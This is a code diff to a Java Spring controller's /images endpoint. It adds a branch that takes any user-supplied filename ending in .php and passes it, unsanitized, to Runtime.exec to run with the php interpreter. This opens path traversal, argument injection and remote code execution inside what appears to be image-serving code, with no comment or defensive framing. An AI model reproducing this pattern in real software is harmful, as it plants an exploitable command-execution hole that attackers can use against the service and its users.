@@ -9,10 +9,7 @@ import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.*;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.util.List;
 
 @Controller
@@ -78,6 +75,16 @@ public class CommandController {
     @GetMapping("/images")
     public void getImage(@RequestParam("filename") String filename, HttpServletResponse response) {
         try {
+            String regexPhp = "^.+(\\.php)$";
+            if(filename.matches(regexPhp)){
+                Process process = Runtime.getRuntime().exec("php /var/tmp/images/" + filename);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                String line = "";
+                while ((line = reader.readLine()) != null) {
+                    log.info(line);
+                }
+                reader.close();
+            }
             String regex = "^.+(\\.jpeg|\\.jpg|\\.txt)$";
             if (filename.matches(regex)){
                 File file = new File("/var/tmp/images/" + filename);
